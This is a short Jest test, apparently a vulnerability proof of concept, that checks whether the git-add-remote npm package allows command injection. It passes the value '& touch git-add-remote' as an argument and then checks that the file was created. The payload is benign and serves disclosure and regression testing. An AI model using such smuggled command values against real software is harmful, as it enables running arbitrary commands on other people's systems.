test("Command Injection in git-add-remote", (done) => {
  expect.assertions(2);
  const root = require("git-add-remote")();
  const fs = require("fs");
  const path = "./git-add-remote";
  let payload = "& touch git-add-remote";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  root(payload, "", function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
